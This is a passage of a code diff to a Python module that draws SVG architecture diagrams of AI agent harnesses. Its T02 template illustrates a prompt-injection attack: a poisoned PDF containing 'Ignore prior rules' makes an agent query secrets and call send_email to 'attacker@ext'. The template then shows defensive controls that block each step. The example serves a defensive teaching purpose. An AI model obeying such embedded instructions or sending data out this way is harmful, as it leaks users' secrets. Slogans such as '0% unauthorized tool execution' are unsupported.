@@ -280,9 +280,11 @@ CSS = """
 
 def _frame(tid: str, meta: Dict[str, Any], title: str, subtitle: str, body: Sequence[str], source_note: str,
            lineage: Optional[str] = None) -> str:
-    p1, w1 = _pill(56, 32, f"{tid} • {meta['name'].upper()}", BLUE, "#EFF6FF")
-    p2, _ = _pill(56 + w1 + 10, 32, f"BEST FOR: {meta['best_for_short'].upper()}", GREEN, "#ECFDF5")
-    p3, _ = _pill(1544, 32, (f"FORMAT LINEAGE: {lineage}" if lineage else "DYNAMIC TEMPLATE • MOVING ARROWS & LIVE PACKETS"), "#0284C7", "#F0F9FF", text_fill="#0369A1", anchor_end=True)
+    p1, w1 = _pill(58, 30, f"{tid} • {meta['name'].upper()}", BLUE, "#EFF6FF")
+    p2, w2 = _pill(58 + w1 + 10, 30, f"BEST FOR: {meta['best_for_short'].upper()}", GREEN, "#ECFDF5")
+    p2b, _ = _pill(58 + w1 + 10 + w2 + 10, 30, "GOOGLE CLOUD + OPEN-SOURCE PARITY", PURPLE, "#F5F3FF")
+    right_tag = f"FORMAT LINEAGE: {lineage}" if lineage else "DYNAMIC TEMPLATE • LIVE SIGNAL PACKETS"
+    p3, _ = _pill(1544, 30, right_tag, SKY, "#F0F9FF", text_fill="#0369A1", anchor_end=True)
     parts = [
         f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 {W} {H}" width="{W}" height="{H}">',
         "<defs>",
@@ -322,16 +324,17 @@ def _frame(tid: str, meta: Dict[str, Any], title: str, subtitle: str, body: Sequ
         parts.append(_r(i * 400, 0, 400, 7, 0, c))
     parts += [
         _r(36, 18, 1528, 94, 12, WHITE, LINE, 1.8, 'filter="url(#shadow)"'),
-        p1, p2, p3,
-        _t(56, 80, title, 21, 800, INK),
-        _t(56, 103, subtitle, 12.5, 700, SLATE),
+        _r(36, 18, 8, 94, 4, BLUE),
+        p1, p2, p2b, p3,
+        _t(58, 79, title, 20.5, 800, INK),
+        _t(58, 102, subtitle, 12.2, 700, SLATE),
     ]
     parts += list(body)
     src_size = 9.0 if len(source_note) > 145 else (9.8 if len(source_note) > 125 else 10.5)
     parts += [
-        '<rect x="36" y="946" width="1528" height="25" rx="8" fill="#FFFFFF" fill-opacity="0.86" stroke="#E2E8F0" stroke-width="1"/>',
-        _t(56, 963, "Curated by Nitin Aggarwal  •  Google Cloud ADK + OpenHands Factory  •  Proprietary + Confidential", 11, 800, MUTED),
-        _t(1544, 963, source_note, src_size, 700, "#1D4ED8", "end"),
+        '<rect x="36" y="944" width="1528" height="28" rx="14" fill="#0F172A" stroke="#1E293B" stroke-width="1"/>',
+        _t(56, 962, "Curated by Nitin Aggarwal  •  Google Cloud ADK + OpenHands Factory  •  Proprietary + Confidential", 10.5, 800, "#E2E8F0"),
+        _t(1544, 962, source_note, src_size, 700, "#93C5FD", "end"),
         "</svg>",
     ]
     return "\n".join(parts)
@@ -345,9 +348,9 @@ def _grow(phase: Optional[float]) -> float:
 # T01 — Pain-Point Flow (delegates to the dynamic engine: Problem -> 4-Step Fix -> Before/After)
 # ----------------------------------------------------------------------------------------------------------------------
 def render_t01(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
-    from src.visuals.dynamic_diagram_engine import generate_dynamic_solution_svg
+    from src.visuals.template_gallery_v4 import _render_canonical_pc
 
-    return generate_dynamic_solution_svg(spec, frame_phase=phase)
+    return _render_canonical_pc("T01", spec, phase)
 
 
 # ----------------------------------------------------------------------------------------------------------------------
@@ -356,48 +359,114 @@ def render_t01(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
 def render_t02(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
     s = spec
     b: List[str] = []
-    b.append(_card_head(56, 420, 230, 160, "#334155", "SHARED START (IDENTICAL INPUT)"))
-    b.append(_tl(72, 470, _wrap(s["start"]["label"], 26, 2), 13.5, 800, INK, 19))
-    b.append(_tl(72, 518, _wrap(s["start"]["sub"], 30, 3), 11.5, 600, SLATE, 17))
-    b.append(_r(56, 600, 230, 250, 10, WHITE, "#94A3B8", 1.6))
-    b.append(_r(56, 600, 8, 250, 4, "#94A3B8"))
-    b.append(_t(76, 624, "WHY THEY LOOK IDENTICAL", 10.5, 800, "#334155"))
-    b.append(_tl(76, 648, _wrap(s["why_identical"], 28, 10), 11.5, 600, "#1E293B", 17))
-    lanes = [
-        ("A. " + s["safe_lane"]["name"], s["safe_lane"]["nodes"], 140, "#ECFDF5", "#6EE7B7", "#065F46", GREEN),
-        ("B. " + s["attack_lane"]["name"], s["attack_lane"]["nodes"], 470, "#FEF2F2", "#FCA5A5", "#991B1B", RED),
+
+    # Left Column (x=36..296): 3 stacked architectural context cards eliminating the top-left dead void
+    # Card 1: Threat Vector & Token Stream Mixing (y=128..318)
+    b.append(_card_head(36, 128, 260, 190, RED, "THREAT VECTOR • OWASP LLM01", head_h=26))
+    b.append(_t(52, 174, "Untrusted Data Shares Token Stream", 12, 800, INK))
+    b.append(_tl(52, 194, [
+        "Retrieved PDFs, emails, and web pages",
+        "are concatenated into the same context",
+        "window as trusted system instructions.",
+    ], 10.5, 600, SLATE, 15))
+    b.append(_r(50, 244, 232, 36, 6, "#FEF2F2", "#FCA5A5", 1.2))
+    b.append(_t(166, 259, "[System Prompt] + [User Ask] + [PDF]", 9.5, 700, "#991B1B", "middle", True))
+    b.append(_t(166, 273, "-> 1 Flat Attention Window", 9.2, 800, RED, "middle", True))
+    b.append(_pill(52, 288, "SURFACE: RAG • EMAIL • DOCS", RED, "#FEF2F2", size=9.0, h=20)[0])
+
+    # Card 2: Shared Start (Identical Input) (y=332..538)
+    b.append(_card_head(36, 332, 260, 206, "#334155", "SHARED START (IDENTICAL INPUT)", head_h=26))
+    b.append(_tl(52, 378, _wrap(s["start"]["label"], 28, 2), 12.5, 800, INK, 17))
+    b.append(_tl(52, 418, _wrap(s["start"]["sub"], 32, 3), 10.8, 600, SLATE, 15.5))
+    b.append(_r(50, 470, 232, 28, 6, "#F1F5F9", "#94A3B8", 1.2))
+    b.append(_t(166, 488, "TOOLS: send_email() • db_query()", 9.5, 700, NAVY, "middle", True))
+    b.append(_pill(50, 506, "PATH A: CLEAN PDF", GREEN, "#ECFDF5", size=8.8, h=20)[0])
+    b.append(_pill(172, 506, "PATH B: POISONED", RED, "#FEF2F2", size=8.8, h=20)[0])
+
+    # Card 3: Why They Look Identical (y=552..784)
+    b.append(_card_head(36, 552, 260, 232, "#475569", "WHY WORDING ALONE FAILS", head_h=26))
+    b.append(_tl(52, 598, _wrap(s["why_identical"], 31, 7), 10.8, 600, "#1E293B", 16))
+    b.append(_r(50, 718, 232, 52, 6, "#EFF6FF", "#93C5FD", 1.2))
+    b.append(_t(166, 738, "DEFENSE MANDATE", 9.5, 800, BLUE, "middle"))
+    b.append(_t(166, 756, "Enforce taint flags in code, not prose", 9.5, 700, NAVY, "middle"))
+
+    # Center Lanes (x=330..1150): Safe Path (Lane A) vs Attack Path (Lane B)
+    safe_meta = [
+        {"stage": "STEP 1 • INGEST", "badge": "CLEAN", "trace": ["mime: application/pdf (verified)", "injection_score: 0.01 (benign)"], "stack": "GOOGLE: Document AI • OSS: Unstructured"},
+        {"stage": "STEP 2 • CONTEXT", "badge": "ISOLATED", "trace": ["stream: [sys, ask, clean_doc]", "taint_flag: False • tools: READ"], "stack": "GOOGLE: Vertex Gemini • OSS: vLLM"},
+        {"stage": "STEP 3 • OUTPUT", "badge": "ALIGNED", "trace": ["tools_invoked: none (0 writes)", "output: grounded summary only"], "stack": "GOOGLE: Cloud Audit • OSS: OpenTelemetry"},
     ]
-    for name, nodes, ly, fill, stroke, tcol, acol in lanes:
-        b.append(_r(330, ly, 820, 300, 12, fill, stroke, 2))
-        b.append(_t(350, ly + 24, name, 11.5, 800, tcol))
+    attack_meta = [
+        {"stage": "STEP 1 • INGEST", "badge": "POISONED", "trace": ["hidden_text: 'Ignore prior rules'", "directive: 'SELECT * FROM secrets'"], "stack": "SCAN: Model Armor • OSS: Llama Guard"},
+        {"stage": "STEP 2 • HIJACK", "badge": "TAINTED", "trace": ["attention_shift: doc -> command", "taint_flag: UNSET (no guard)"], "stack": "GUARD: ADK Taint • OSS: LangGraph State"},
+        {"stage": "STEP 3 • EXFIL!", "badge": "BREACH", "trace": ["1. db_query('SELECT * secrets')", "2. send_email(to='attacker@ext')"], "stack": "GATE: Cloud IAP JWT • OSS: OPA + OIDC"},
+    ]
+    lanes = [
+        ("A. " + s["safe_lane"]["name"], s["safe_lane"]["nodes"], safe_meta, 128, "#ECFDF5", "#6EE7B7", "#065F46", GREEN, "#D1FAE5"),
+        ("B. " + s["attack_lane"]["name"], s["attack_lane"]["nodes"], attack_meta, 466, "#FEF2F2", "#FCA5A5", "#991B1B", RED, "#FEE2E2"),
+    ]
+    for name, nodes, metas, ly, fill, stroke, tcol, acol, chip_fill in lanes:
+        b.append(_r(330, ly, 820, 318, 12, fill, stroke, 2))
+        b.append(_t(348, ly + 24, name, 11.5, 800, tcol))
+        lane_pill = "0 UNAUTHORIZED TOOL CALLS" if acol == GREEN else "CRITICAL: SILENT DATA EXFILTRATION"
+        b.append(_pill(1134, ly + 8, lane_pill, acol, WHITE, size=9.0, h=20, anchor_end=True)[0])
         for i, n in enumerate(nodes[:3]):
-            nx, ny = 350 + i * 272, ly + 44
-            b.append(_card_head(nx, ny, 240, 220, acol, f"STEP {i + 1}"))
-            b.append(_tl(nx + 14, ny + 52, _wrap(n["label"], 27, 2), 13, 800, INK, 18))
-            b.append(_tl(nx + 14, ny + 98, _wrap(n["sub"], 32, 6), 11.5, 600, SLATE, 16))
+            nx, ny = 348 + i * 268, ly + 38
+            m = metas[i]
+            b.append(_card_head(nx, ny, 244, 264, acol, m["stage"], head_h=26))
+            b.append(_tl(nx + 14, ny + 48, _wrap(n["label"], 26, 2), 12.2, 800, INK, 16.5))
+            b.append(_tl(nx + 14, ny + 86, _wrap(n["sub"], 31, 4), 10.6, 600, SLATE, 15))
+            # Telemetry / Payload Trace Box inside card (fills lower half cleanly)
+            b.append(_r(nx + 12, ny + 152, 220, 58, 7, "#F8FAFC", acol, 1.2))
+            b.append(_t(nx + 20, ny + 168, f"RUNTIME TRACE • {m['badge']}", 8.8, 800, acol))
+            b.append(_t(nx + 20, ny + 184, m["trace"][0], 9.2, 600, INK, mono=True))
+            b.append(_t(nx + 20, ny + 199, m["trace"][1], 9.2, 600, SLATE, mono=True))
+            # Stack footer strip
+            b.append(_r(nx + 12, ny + 220, 220, 32, 6, chip_fill, acol, 1.0))
+            b.append(_t(nx + 122, ny + 240, m["stack"], 8.9, 800, tcol, "middle"))
             if i < 2:
-                b.append(_flow([(nx + 242, ny + 110), (nx + 270, ny + 110)], acol, phase, None, 1.2, 3.4, True, 1))
-    b.append(_flow([(286, 470), (312, 470), (312, 294), (350, 294)], GREEN, phase, None, 2.0, 3.6, True, 1))
-    b.append(_flow([(286, 540), (312, 540), (312, 624), (350, 624)], RED, phase, None, 2.0, 3.6, True, 1))
-    b.append(_t(304, 392, "benign", 9.5, 800, GREEN, "end"))
-    b.append(_t(304, 612, "hostile", 9.5, 800, RED, "end"))
-    b.append(_r(1180, 140, 384, 630, 12, WHITE, "#A5B4FC", 2))
-    b.append(_r(1180, 140, 384, 34, 10, PURPLE))
-    b.append(_t(1198, 162, "C. " + s["controls_title"], 11.5, 800, WHITE))
+                b.append(_flow([(nx + 246, ny + 132), (nx + 266, ny + 132)], acol, phase, None, 1.2, 3.2, True, 0, solid=True))
+
+    # Bifurcation flows from Shared Start (x=296) into Safe Lane (y=286) and Attack Lane (y=624)
+    b.append(_flow([(296, 412), (314, 412), (314, 286), (348, 286)], GREEN, phase, None, 2.0, 3.4, True, 1))
+    b.append(_flow([(296, 458), (314, 458), (314, 624), (348, 624)], RED, phase, None, 2.0, 3.4, True, 1))
+
+    # Right Controls Panel (x=1182..1564, y=128..784)
+    b.append(_r(1182, 128, 382, 656, 12, WHITE, "#A5B4FC", 2))
+    b.append(_r(1182, 128, 382, 34, 10, PURPLE))
+    b.append(_t(1198, 150, "C. " + s["controls_title"], 11.2, 800, WHITE))
+    ctrl_targets = ["BLOCKS STEP 1", "BLOCKS STEP 2", "BLOCKS STEP 3"]
+    # Single clean vertical intercept bus at x=1166 with 1 traveling packet on main trunk and solid branches
+    b.append(_flow([(1128, 624), (1166, 624), (1166, 272), (1196, 272)], PURPLE, phase, None, 2.2, 3.0, True, 1))
     for i, c in enumerate(s["controls"][:3]):
-        cy = 196 + i * 190
-        b.append(_flow([(1134, 624), (1162, 624), (1162, cy + 80), (1196, cy + 80)], PURPLE, phase, None, 2.4, 3, True, 1))
-        b.append(_r(1198, cy, 348, 164, 10, "#F5F3FF", PURPLE, 1.6))
-        b.append(_t(1214, cy + 26, f"CONTROL {i + 1} • {c['name']}", 11, 800, PURPLE))
-        b.append(_tl(1214, cy + 48, _wrap(c["how"], 46, 5), 11, 600, "#1E293B", 15.5))
-        b.append(_pill(1214, cy + 132, c["gcp"], PURPLE)[0])
-    b.append(_r(330, 800, 1234, 62, 14, NAVY))
-    b.append(_t(947, 824, "ARCHITECTURAL INVARIANT", 10.5, 800, "#93C5FD", "middle"))
-    b.append(_t(947, 848, s["invariant"], 13.5, 800, WHITE, "middle"))
-    for i, (col, txt) in enumerate([(GREEN, "Green packets = safe flow"), (RED, "Red packets = attack flow"), (PURPLE, "Purple packets = control intercept")]):
-        lx = 330 + i * 300
-        b.append(f'<circle cx="{lx + 10}" cy="{896}" r="6" fill="{col}"/>')
-        b.append(_t(lx + 24, 900, txt, 11, 700, SLATE))
+        cy = 178 + i * 198
+        if i > 0:
+            b.append(_flow([(1166, cy + 94), (1196, cy + 94)], PURPLE, phase, None, 1.6, 2.8, True, 0, solid=True))
+        b.append(_r(1198, cy, 350, 182, 10, "#F5F3FF", PURPLE, 1.6))
+        b.append(_r(1198, cy, 350, 26, 8, "#EDE9FE"))
+        b.append(_t(1212, cy + 17, f"CONTROL {i + 1} • {c['name']}", 10.0, 800, PURPLE))
+        b.append(_r(1446, cy + 4, 94, 18, 9, WHITE, PURPLE, 1.0))
+        b.append(_t(1493, cy + 16, ctrl_targets[i], 8.2, 800, "#4C1D95", "middle"))
+        b.append(_tl(1212, cy + 44, _wrap(c["how"], 50, 5), 10.4, 600, "#1E293B", 15.0))
+        b.append(_pill(1212, cy + 148, f"STACK: {c['gcp']}", PURPLE, WHITE, size=9.0, h=22)[0])
+
+    # Bottom Architectural Invariant + Signal Legend (x=36..1564, y=798..932)
+    b.append(_r(36, 798, 1528, 72, 12, NAVY))
+    b.append(_pill(56, 810, "ARCHITECTURAL INVARIANT", "#60A5FA", "#1E3A8A", size=9.5, h=22, text_fill="#EFF6FF")[0])
+    b.append(_t(278, 825, "DETERMINISTIC CAPABILITY CONTAINMENT (ZERO-TRUST AGENT HARNESS)", 10.5, 800, "#93C5FD"))
+    b.append(_t(56, 854, s["invariant"], 13.0, 800, WHITE))
+
+    b.append(_r(36, 880, 1528, 50, 10, WHITE, LINE, 1.4))
+    legend_items = [
+        (GREEN, "Green packets = verified benign execution flow"),
+        (RED, "Red packets = untrusted / hijacked token flow"),
+        (PURPLE, "Purple packets = deterministic control intercept"),
+        (BLUE, "Result: 0% unauthorized tool execution under taint"),
+    ]
+    for i, (col, txt) in enumerate(legend_items):
+        lx = 56 + i * 376
+        b.append(f'<circle cx="{lx + 8}" cy="905" r="6" fill="{col}"/>')
+        b.append(_t(lx + 22, 909, txt, 10.8, 700, INK if i == 3 else SLATE))
     return _frame("T02", TEMPLATE_META["T02"], s["title"], s["subtitle"], b, s["source"])
 
 
@@ -406,33 +475,76 @@ def render_t02(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
 # ----------------------------------------------------------------------------------------------------------------------
 def render_t03(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
     s = spec
-    cx, cy, a, bb = 800, 536, 610, 318
-    cw, ch = 236, 84
+    cx, cy = 800, 488
+    cw, ch = 268, 108
+    # 10 non-overlapping orbital coordinates around (800, 488) with >= 46px vertical & >= 115px horizontal clearance
+    coords: List[Tuple[float, float]] = [
+        (800, 186),   # 01 Top Center
+        (1186, 224),  # 02 Top-Right Upper
+        (1404, 384),  # 03 Mid-Right Upper
+        (1404, 592),  # 04 Mid-Right Lower
+        (1186, 752),  # 05 Bottom-Right
+        (800, 790),   # 06 Bottom Center
+        (414, 752),   # 07 Bottom-Left
+        (196, 592),   # 08 Mid-Left Lower
+        (196, 384),   # 09 Mid-Left Upper
+        (414, 224),   # 10 Top-Left Upper
+    ]
+    spoke_contracts = [
+        "GOOGLE: ADK Rules • OSS: AGENTS.md",
+        "GOOGLE: Vertex KV • OSS: vLLM Prefix",
+        "GOOGLE: ADK Skills • OSS: LangChain",
+        "GOOGLE: AlloyDB • OSS: pgvector/Mem0",
+        "GOOGLE: Cloud IAM • OSS: OPA Rego",
+        "GOOGLE: Apigee MCP • OSS: FastMCP",
+        "GOOGLE: Vertex Eval • OSS: Promptfoo",
+        "GOOGLE: Cloud Trace • OSS: Langfuse",
+        "GOOGLE: Cloud Run • OSS: OpenHands",
+        "GOOGLE: ADK Runtime • OSS: Temporal",
+    ]
     flows: List[str] = []
     cards: List[str] = []
+    # Subtle orbital guide rings
+    flows.append(f'<ellipse cx="{cx}" cy="{cy}" rx="590" ry="302" fill="none" stroke="#CBD5E1" stroke-width="1.4" stroke-dasharray="6 8"/>')
+    flows.append(f'<circle cx="{cx}" cy="{cy}" r="186" fill="none" stroke="#93C5FD" stroke-width="1.2" stroke-dasharray="4 6"/>')
+
     for i, sp in enumerate(s["spokes"][:10]):
-        ang = math.radians(-90 + i * 36)
-        px, py = cx + a * math.cos(ang), cy + bb * math.sin(ang)
+        px, py = coords[i]
         dx, dy = cx - px, cy - py
         L = math.hypot(dx, dy)
         ux, uy = dx / L, dy / L
         tx = (cw / 2) / abs(ux) if abs(ux) > 1e-6 else 1e9
         ty = (ch / 2) / abs(uy) if abs(uy) > 1e-6 else 1e9
-        t = min(tx, ty) + 2
+        t = min(tx, ty) + 4
         sx, sy = px + ux * t, py + uy * t
-        ex, ey = cx - ux * 128, cy - uy * 128
+        ex, ey = cx - ux * 134, cy - uy * 134
         col = sp.get("color", QUAD[i % 4])
-        flows.append(_flow([(sx, sy), (ex, ey)], col, phase, None, 2.2, 3, True, 1, dash="10 7"))
-        cards.append(_card_head(px - cw / 2, py - ch / 2, cw, ch, col, sp["code"], head_h=22))
-        cards.append(_t(px, py + 8, sp["title"], 12.5, 800, INK, "middle"))
-        cards.append(_t(px, py + 28, sp["sub"], 10.5, 600, SLATE, "middle"))
+        flows.append(_flow([(sx, sy), (ex, ey)], col, phase, None, 2.2, 3.0, True, 1, dash="10 7"))
+        x0, y0 = px - cw / 2, py - ch / 2
+        cards.append(_card_head(x0, y0, cw, ch, col, sp["code"], head_h=24))
+        cards.append(_t(px, y0 + 44, sp["title"], 12.2, 800, INK, "middle"))
+        cards.append(_t(px, y0 + 62, sp["sub"], 10.2, 600, SLATE, "middle"))
+        contract = sp.get("contract", spoke_contracts[i % len(spoke_contracts)])
+        cards.append(_r(x0 + 10, y0 + 72, cw - 20, 26, 6, "#F8FAFC", col, 1.1))
+        cards.append(_t(px, y0 + 89, contract, 9.0, 800, col, "middle", mono=True))
+
     b = flows
-    b.append(f'<circle cx="{cx}" cy="{cy}" r="134" fill="{BLUE}" fill-opacity="0.10"/>')
-    b.append(f'<circle cx="{cx}" cy="{cy}" r="118" fill="{NAVY}" stroke="#4285F4" stroke-width="4" class="pulse"/>')
+    b.append(f'<circle cx="{cx}" cy="{cy}" r="142" fill="{BLUE}" fill-opacity="0.09"/>')
+    b.append(f'<circle cx="{cx}" cy="{cy}" r="126" fill="{NAVY}" stroke="#4285F4" stroke-width="4" class="pulse"/>')
+    b.append(f'<circle cx="{cx}" cy="{cy}" r="114" fill="none" stroke="#60A5FA" stroke-opacity="0.35" stroke-width="1.2"/>')
+    b.append(_pill(cx - 72, cy - 92, "HARNESS KERNEL", "#60A5FA", "#1E3A8A", size=8.8, h=20, text_fill="#EFF6FF")[0])
     hub_lines = s["hub"]["lines"][:4]
-    b.append(_tl(cx, cy - 26, hub_lines, 12.5, 800, WHITE, 20, "middle"))
-    b.append(_t(cx, cy + 62, s["hub"]["badge"], 9.5, 800, "#86EFAC", "middle"))
+    b.append(_tl(cx, cy - 42, hub_lines, 12.2, 800, WHITE, 20, "middle"))
+    # Compact badge inside circle chord at y=cy+52 (chord width = 228px, pill width = 184px -> zero overflow!)
+    b.append(_r(cx - 92, cy + 40, 184, 24, 12, "#064E3B", "#34D399", 1.4))
+    b.append(_t(cx, cy + 56, "ADK • LANGGRAPH BUS", 9.2, 800, "#A7F3D0", "middle"))
     b += cards
+
+    # Bottom Architectural Takeaway Bar (y=866..932)
+    b.append(_r(36, 866, 1528, 64, 12, NAVY))
+    b.append(_pill(56, 878, "ARCHITECTURAL FORMULA", "#60A5FA", "#1E3A8A", size=9.2, h=20, text_fill="#EFF6FF")[0])
+    b.append(_t(262, 892, "Agent Reliability = Model Core × Deterministic 10-Spoke Harness (Google Cloud Managed Service or Open-Source Twin)", 11.2, 800, "#93C5FD"))
+    b.append(_t(56, 916, "Swapping models yields single-digit gains; engineering the 10 surrounding harness subsystems eliminates 90%+ of production failures.", 11.8, 700, WHITE))
     return _frame("T03", TEMPLATE_META["T03"], s["title"], s["subtitle"], b, s["source"])
 
 
@@ -442,27 +554,62 @@ def render_t03(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
 def render_t04(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
     s = spec
     b: List[str] = []
+    layer_slas = ["SLA: p99 < 40ms", "MAX_STEPS <= 15", "TOP-3 MCP TOOLS", "SHA-256 RECEIPTS", "mTLS + CMEK KMS"]
+    descent_steps = ["1. Ingress", "2. Guard", "3. Route", "4. State", "5. Perimeter"]
+
+    # Left Request Descent Bus Panel (x=36..192, y=130..864)
+    b.append(_r(36, 130, 156, 734, 12, "#EFF6FF", "#93C5FD", 1.8))
+    b.append(_r(36, 130, 156, 32, 10, BLUE))
+    b.append(_t(114, 150, "① REQUEST IN", 10.5, 800, WHITE, "middle"))
+    b.append(_flow([(86, 178), (86, 844)], BLUE, phase, None, 3.0, 3.8, True, 3, dash="12 8"))
+
+    # Right Ascent Conduit Channel (x=1186..1234)
+    b.append(_flow([(1206, 844), (1206, 146)], GREEN, phase, None, 3.0, 3.8, True, 3, dash="12 8"))
+
     for i, l in enumerate(s["layers"][:5]):
-        y = 140 + i * 148
+        y = 130 + i * 148
         col = l["color"]
-        b.append(_r(240, y, 1000, 130, 12, WHITE, col, 2.2))
-        b.append(_r(240, y, 170, 130, 12, col))
-        b.append(_t(325, y + 50, l["code"], 13, 800, WHITE, "middle"))
-        b.append(_tl(325, y + 74, _wrap(l["name"], 18, 2), 11, 700, WHITE, 15, "middle"))
+        # Tap connector from Left Descent Bus into Layer
+        b.append(_t(138, y + 52, descent_steps[i], 9.2, 800, BLUE, "middle"))
+        b.append(_flow([(86, y + 66), (206, y + 66)], BLUE, phase, None, 1.4, 2.6, True, 0, solid=True))
+
+        # Main Layer Card (x=206..1174, w=968, h=138)
+        b.append(_r(206, y, 968, 138, 12, WHITE, col, 2.2))
+        b.append(_r(206, y, 168, 138, 12, col))
+        b.append(_t(290, y + 36, l["code"], 15, 800, WHITE, "middle"))
+        b.append(_tl(290, y + 58, _wrap(l["name"], 17, 2), 10.8, 800, WHITE, 14.5, "middle"))
+        b.append(_r(224, y + 98, 132, 24, 12, "#0F172A", WHITE, 1.0, 'fill-opacity="0.28"'))
+        b.append(_t(290, y + 114, layer_slas[i], 8.8, 800, WHITE, "middle", mono=True))
+
+        # 4 Dual-Stack Component Cards inside Layer
         for j, chip in enumerate(l["chips"][:4]):
-            chx = 430 + j * 198
-            b.append(_r(chx, y + 18, 186, 44, 8, "#F8FAFC", col, 1.4))
-            b.append(_tl(chx + 93, y + 36, _wrap(chip, 24, 2), 10.5, 800, INK, 13, "middle"))
-        b.append(_t(430, y + 100, l["desc"], 11.5, 600, SLATE))
-        b.append(_r(1320, y, 244, 130, 10, "#F8FAFC", col, 1.6))
-        b.append(_t(1336, y + 24, "GUARANTEE", 10, 800, col))
-        b.append(_tl(1336, y + 46, _wrap(l["guarantee"], 30, 5), 11.5, 700, INK, 16))
-    b.append(_flow([(140, 150), (140, 860)], BLUE, phase, None, 3.2, 4, True, 3, dash="14 10"))
-    b.append(_flow([(1280, 860), (1280, 150)], GREEN, phase, None, 3.2, 4, True, 3, dash="14 10"))
-    b.append(_pill(56, 118, "① REQUEST DESCENDS", BLUE, "#EFF6FF")[0])
-    b.append(_pill(1180, 118, "② VERIFIED RESPONSE ASCENDS", GREEN, "#ECFDF5")[0])
-    b.append(_r(56, 880, 1508, 52, 12, NAVY))
-    b.append(_t(806, 912, s["bottom_note"], 12.5, 800, WHITE, "middle"))
+            chx = 388 + j * 192
+            b.append(_r(chx, y + 12, 182, 76, 8, "#F8FAFC", col, 1.4))
+            b.append(_r(chx, y + 12, 182, 20, 6, col, None, 0, 'fill-opacity="0.12"'))
+            b.append(_t(chx + 91, y + 26, f"GOOGLE CLOUD / OSS #{j + 1}", 8.2, 800, col, "middle"))
+            if " / " in chip:
+                g_part, o_part = chip.split(" / ", 1)
+                b.append(_t(chx + 91, y + 48, g_part.strip(), 10.0, 800, INK, "middle"))
+                b.append(_t(chx + 91, y + 68, "OSS: " + o_part.strip(), 9.2, 700, SLATE, "middle"))
+            else:
+                b.append(_tl(chx + 91, y + 50, _wrap(chip, 23, 2), 10.0, 800, INK, 14, "middle"))
+
+        # Layer Architectural Role Strip at bottom of Layer
+        b.append(_r(388, y + 96, 772, 30, 6, "#F1F5F9", "#CBD5E1", 1.0))
+        b.append(_t(400, y + 115, "LAYER ROLE: " + l["desc"], 10.2, 700, "#1E293B"))
+
+        # Tap connector from Layer -> Right Ascent Bus -> Guarantee Card
+        b.append(_flow([(1174, y + 66), (1234, y + 66)], GREEN, phase, None, 1.4, 2.6, True, 0, solid=True))
+
+        # Right Layer Guarantee Card (x=1234..1564, w=330, h=138)
+        b.append(_card_head(1234, y, 330, 138, col, f"② {l['code']} VERIFIED GUARANTEE", fill="#F8FAFC", head_h=26))
+        b.append(_tl(1248, y + 48, _wrap(l["guarantee"], 38, 3), 10.8, 700, INK, 15.5))
+        b.append(_pill(1248, y + 104, "DETERMINISTIC RECEIPT • PASS", GREEN, "#ECFDF5", size=8.8, h=20)[0])
+
+    # Bottom Executive Rule Bar (x=36..1564, y=876..932)
+    b.append(_r(36, 876, 1528, 54, 12, NAVY))
+    b.append(_pill(56, 892, "PORTABILITY INVARIANT", "#34D399", "#064E3B", size=9.2, h=22, text_fill="#ECFDF5")[0])
+    b.append(_t(268, 907, s["bottom_note"], 11.8, 800, WHITE))
     return _frame("T04", TEMPLATE_META["T04"], s["title"], s["subtitle"], b, s["source"])
 
 
@@ -471,44 +618,118 @@ def render_t04(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
 # ----------------------------------------------------------------------------------------------------------------------
 def render_t05(spec: Dict[str, Any], phase: Optional[float] = None) -> str:
     s = spec
-    cx, cy, R = 520, 540, 290
     b: List[str] = []
-    b.append(f'<circle cx="{cx}" cy="{cy}" r="{R}" fill="none" stroke="#FDE68A" stroke-width="1.5" stroke-dasharray="4 6"/>')
-    b.append(f'<circle cx="{cx}" cy="{cy}" r="150" fill="#FEFCE8" stroke="#F59E0B" stroke-width="2.5" stroke-dasharray="8 5"/>')
-    b.append(_tl(cx, cy - 30, s["center_lines"][:4], 12.5, 800, "#92400E", 19, "middle"))
+
+    # Left Column (x=36..272, w=236): Step 1 Input, Context Compaction Packet, and Loop Telemetry
+    st1 = s["entry"]
+    b.append(_card_head(36, 132, 236, 210, BLUE, st1["badge"], head_h=26))
+    b.append(_t(50, 178, "Session & Governance Payload", 11.5, 800, INK))
+    b.append(_tl(50, 198, _wrap(st1["text"], 30, 4), 10.5, 600, SLATE, 15.5))
+    b.append(_r(48, 266, 212, 32, 6, "#EFF6FF", "#93C5FD", 1.2))
+    b.append(_t(154, 286, "GOOGLE: ADK • OSS: AGENTS.md", 8.8, 800, BLUE, "middle", mono=True))
+    b.append(_pill(48, 308, "PREFIX CACHE: PINNED", GREEN, "#ECFDF5", size=8.5, h=20)[0])
+
+    # Vertical conduit from Step 1 (y=342) to Context Envelope Card (y=402)
+    b.append(_flow([(154, 342), (154, 402)], BLUE, phase, None, 1.6, 3.2, True, 1))
+
+    # Card 2: Context Envelope Injected into Loop (y=402..594)
+    b.append(_card_head(36, 402, 236, 192, SKY, "CONTEXT ENVELOPE -> STEP 2", head_h=26))
+    b.append(_t(50, 446, "Scoped State Enters Flywheel", 11.5, 800, INK))
+    b.append(_r(48, 460, 212, 86, 7, "#F8FAFC", SKY, 1.2))
+    b.append(_tl(58, 480, [
+        "session_id: adk_run_9f4c2a",
+        "max_steps:  15 (ceiling)",
+        "max_budget: $0.25 / task",
+        "verify_hook: pytest_exit_0",
+    ], 9.2, 600, NAVY, 16.5, mono=True))
+    b.append(_t(154, 572, "Feeds Step 2 via deterministic bus", 9.5, 700, SLATE, "middle"))
+
+    # Clean 36px horizontal feed from Context Envelope (x=272, y=498) into Step 2 (x=308, y=498)
+    b.append(_flow([(272, 498), (308, 498)], BLUE, phase, None, 1.4, 3.2, True, 0, solid=True))
+
+    # Card 3: Loop Invariants & Signal Key (y=616..882)
+    b.append(_card_head(36, 616, 236, 266, "#334155", "FLYWHEEL INVARIANTS & KEY", head_h=26))
+    b.append(_tl(50, 660, [
+        "• LLM never decides when to exit;",
+        "  only Step 5 Gate terminates.",
+        "• Every tool call writes a WAL",
+        "  checkpoint before next turn.",
